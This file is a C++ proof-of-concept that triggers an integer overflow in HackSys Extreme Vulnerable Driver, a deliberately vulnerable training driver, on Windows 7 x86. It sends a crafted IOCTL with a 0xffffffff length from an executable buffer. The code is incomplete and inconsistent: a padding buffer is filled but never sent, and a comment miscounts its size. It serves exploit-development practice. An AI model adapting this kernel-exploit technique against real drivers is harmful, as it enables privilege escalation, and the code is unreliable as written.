#include <windows.h>
#include <iostream>

#define DEVICE_NAME "\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL 0x222027

int main(){
    std::cout << "[+] HEVD - Integer overflow Windows 7 x86 exploit POC\n\n";

    HANDLE hDevice = CreateFileA(DEVICE_NAME,
                                 GENERIC_READ | GENERIC_WRITE,
                                 FILE_SHARE_READ | FILE_SHARE_WRITE,
                                 NULL,
                                 OPEN_EXISTING,
                                 FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
                                 NULL);

    if (hDevice == INVALID_HANDLE_VALUE){
        std::cout << "[!] Failed to establish a device handler" << GetLastError() << std::endl;
    } else {
        std::cout << "[+] Established a handle to the device - " << DEVICE_NAME << std::endl;
    }

    std::cout << "[+] Preparing the buffer payload\n";

    char* uBuffer = (char*)VirtualAlloc(
                                        NULL,
                                        2088 + 4 + 4,
                                        MEM_COMMIT | MEM_RESERVE,
                                        PAGE_EXECUTE_READWRITE);
    if(uBuffer == NULL){
        std::cout << "\t[!] Failed to allocate buffer" << GetLastError() << std::endl;
    } else {
        std::cout << "[+] Successfully allocation buffer\n";
    }

    BYTE input_buff[0x751] = { 0 };

    // 'A' * 1871
    memset(
        input_buff,
        '\x41',
        0x750);

    DWORD sizeReturn;
    BOOL deviceCom = DeviceIoControl(hDevice,
                    IOCTL,
                    uBuffer,
                    0xffffffff,
                    NULL,
                    0,
                    &sizeReturn,
                    NULL);
    if(deviceCom){
        std::cout << "[+] Successfully send buffer payload to the driver\n";
    }

    return 0;
}
